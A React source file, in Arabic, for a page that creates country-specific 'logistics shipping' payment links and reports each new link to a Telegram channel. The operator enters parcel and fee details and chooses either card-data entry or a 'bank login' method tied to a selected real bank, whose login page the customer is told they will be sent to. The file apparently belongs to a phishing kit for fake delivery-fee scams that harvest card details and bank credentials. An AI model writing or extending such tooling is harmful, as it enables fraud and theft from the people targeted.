import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { sendToTelegram } from "@/lib/telegram";
import { Truck, Package, MapPin, User, Phone, DollarSign, CreditCard, Building2, Copy, ExternalLink, Scale } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateLogisticsLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");

  const [senderName, setSenderName] = useState("");
  const [senderPhone, setSenderPhone] = useState("");
  const [senderAddress, setSenderAddress] = useState("");
  const [receiverName, setReceiverName] = useState("");
  const [receiverPhone, setReceiverPhone] = useState("");
  const [receiverAddress, setReceiverAddress] = useState("");
  const [packageType, setPackageType] = useState("");
  const [packageWeight, setPackageWeight] = useState("");
  const [packageDimensions, setPackageDimensions] = useState("");
  const [pickupDate, setPickupDate] = useState("");
  const [notes, setNotes] = useState("");
  const [shippingFee, setShippingFee] = useState("150");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  const packageTypes = [
    { value: "documents", label: "وثائق ومستندات", icon: "📄" },
    { value: "electronics", label: "أجهزة إلكترونية", icon: "💻" },
    { value: "clothing", label: "ملابس وأزياء", icon: "👕" },
    { value: "food", label: "مواد غذائية", icon: "🍎" },
    { value: "furniture", label: "أثاث منزلي", icon: "🪑" },
    { value: "medical", label: "أدوية ومستلزمات طبية", icon: "💊" },
    { value: "automotive", label: "قطع غيار سيارات", icon: "🚗" },
    { value: "other", label: "أخرى", icon: "📦" },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!senderName || !senderPhone || !senderAddress || !receiverName || !receiverPhone || !receiverAddress || !packageType) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    if (paymentMethod === "bank_login" && !selectedBank) {
      toast({
        title: "خطأ",
        description: "الرجاء اختيار البنك",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "logistics",
        country_code: country || "",
        payload: {
          sender_name: senderName,
          sender_phone: senderPhone,
          sender_address: senderAddress,
          receiver_name: receiverName,
          receiver_phone: receiverPhone,
          receiver_address: receiverAddress,
          package_type: packageType,
          package_type_label: packageTypes.find(p => p.value === packageType)?.label || '',
          package_type_icon: packageTypes.find(p => p.value === packageType)?.icon || '',
          package_weight: packageWeight,
          package_dimensions: packageDimensions,
          pickup_date: pickupDate,
          notes: notes,
          shipping_fee: parseFloat(shippingFee) || 150,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "logistics",
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'logistics_link_created',
        data: {
          sender_name: senderName,
          receiver_name: receiverName,
          package_type: packageTypes.find(p => p.value === packageType)?.label || '',
          package_weight: packageWeight,
          pickup_date: pickupDate,
          shipping_fee: parseFloat(shippingFee) || 150,
          country: countryData?.nameAr || '',
          payment_url: paymentUrl
        },
        timestamp: new Date().toISOString(),
        description: `طلب شحن لوجستي - ${packageTypes.find(p => p.value === packageType)?.label}`
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({
          title: "تم إنشاء رابط الشحن بنجاح!",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط الشحن",
        variant: "destructive",
      });
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Truck className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - شحن لوجستي</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="bg-secondary/30 p-3 rounded-lg mb-4">
                <h3 className="font-bold text-sm mb-2">معلومات المرسل</h3>
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  اسم المرسل *
                </Label>
                <Input
                  value={senderName}
                  onChange={(e) => setSenderName(e.target.value)}
                  placeholder="الاسم الكامل"
                  className="h-9 text-sm"
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Phone className="w-3 h-3" />
                  هاتف المرسل *
                </Label>
                <Input
                  type="tel"
                  value={senderPhone}
                  onChange={(e) => setSenderPhone(e.target.value)}
                  placeholder="+966 50 000 0000"
                  className="h-9 text-sm"
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <MapPin className="w-3 h-3" />
                  عنوان المرسل *
                </Label>
                <Textarea
                  value={senderAddress}
                  onChange={(e) => setSenderAddress(e.target.value)}
                  placeholder="العنوان الكامل للاستلام"
                  className="text-sm"
                  rows={2}
                  required
                />
              </div>

              <div className="bg-secondary/30 p-3 rounded-lg mb-4">
                <h3 className="font-bold text-sm mb-2">معلومات المستلم</h3>
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  اسم المستلم *
                </Label>
                <Input
                  value={receiverName}
                  onChange={(e) => setReceiverName(e.target.value)}
                  placeholder="الاسم الكامل"
                  className="h-9 text-sm"
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Phone className="w-3 h-3" />
                  هاتف المستلم *
                </Label>
                <Input
                  type="tel"
                  value={receiverPhone}
                  onChange={(e) => setReceiverPhone(e.target.value)}
                  placeholder="+966 50 000 0000"
                  className="h-9 text-sm"
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <MapPin className="w-3 h-3" />
                  عنوان المستلم *
                </Label>
                <Textarea
                  value={receiverAddress}
                  onChange={(e) => setReceiverAddress(e.target.value)}
                  placeholder="العنوان الكامل للتوصيل"
                  className="text-sm"
                  rows={2}
                  required
                />
              </div>

              <div className="bg-secondary/30 p-3 rounded-lg mb-4">
                <h3 className="font-bold text-sm mb-2">تفاصيل الشحنة</h3>
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" />
                  نوع الشحنة *
                </Label>
                <Select value={packageType} onValueChange={setPackageType}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر نوع الشحنة..." />
                  </SelectTrigger>
                  <SelectContent>
                    {packageTypes.map((type) => (
                      <SelectItem key={type.value} value={type.value}>
                        <div className="flex items-center gap-2">
                          <span>{type.icon}</span>
                          <span>{type.label}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Scale className="w-3 h-3" />
                    الوزن (كجم) *
                  </Label>
                  <Input
                    type="number"
                    value={packageWeight}
                    onChange={(e) => setPackageWeight(e.target.value)}
                    placeholder="5.0"
                    className="h-9 text-sm"
                    step="0.1"
                    min="0.1"
                    required
                  />
                </div>

                <div>
                  <Label className="mb-2 text-sm">الأبعاد (اختياري)</Label>
                  <Input
                    value={packageDimensions}
                    onChange={(e) => setPackageDimensions(e.target.value)}
                    placeholder="50×30×20 سم"
                    className="h-9 text-sm"
                  />
                </div>
              </div>

              <div>
                <Label className="mb-2 text-sm">تاريخ الاستلام المفضل (اختياري)</Label>
                <Input
                  type="date"
                  value={pickupDate}
                  onChange={(e) => setPickupDate(e.target.value)}
                  min={new Date().toISOString().split("T")[0]}
                  className="h-9 text-sm"
                />
              </div>

              <div>
                <Label className="mb-2 text-sm">ملاحظات التوصيل (اختياري)</Label>
                <Textarea
                  value={notes}
                  onChange={(e) => setNotes(e.target.value)}
                  placeholder="أي تعليمات خاصة..."
                  className="text-sm"
                  rows={2}
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  رسوم الشحن
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={shippingFee}
                  onChange={(e) => setShippingFee(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card"
                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                </p>
              </div>

              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="text-sm mb-2 flex items-center gap-2">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background">
                      {banks.length > 0 ? (
                        banks.map((bank) => (
                          <SelectItem key={bank.id} value={bank.id}>
                            <div className="flex items-center gap-2">
                              {bank.logo && (
                                <img
                                  src={bank.logo}
                                  alt={bank.nameAr}
                                  className="h-5 w-5 object-contain"
                                  onError={(e) => e.currentTarget.style.display = 'none'}
                                />
                              )}
                              <span>{bank.nameAr}</span>
                            </div>
                          </SelectItem>
                        ))
                      ) : (
                        <SelectItem value="no-bank" disabled>
                          لا توجد بنوك متاحة
                        </SelectItem>
                      )}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                  </p>
                </div>
              )}

              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Truck className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الشحن</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط الشحن بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>

          <div className="my-4">
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المرسل:</span>
                <span className="font-semibold">{senderName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المستلم:</span>
                <span className="font-semibold">{receiverName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">نوع الشحنة:</span>
                <span className="font-semibold">{packageTypes.find(p => p.value === packageType)?.label}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الوزن:</span>
                <span className="font-semibold">{packageWeight} كجم</span>
              </div>
              {pickupDate && (
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">تاريخ الاستلام:</span>
                  <span className="font-semibold">{pickupDate}</span>
                </div>
              )}
              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
                <span className="text-muted-foreground">رسوم الشحن:</span>
                <span className="font-bold text-lg">
                  {formatCurrency(parseFloat(shippingFee) || 150, country || "SA")}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">طريقة الدفع:</span>
                <span className="font-semibold">
                  {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>

        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateLogisticsLink;
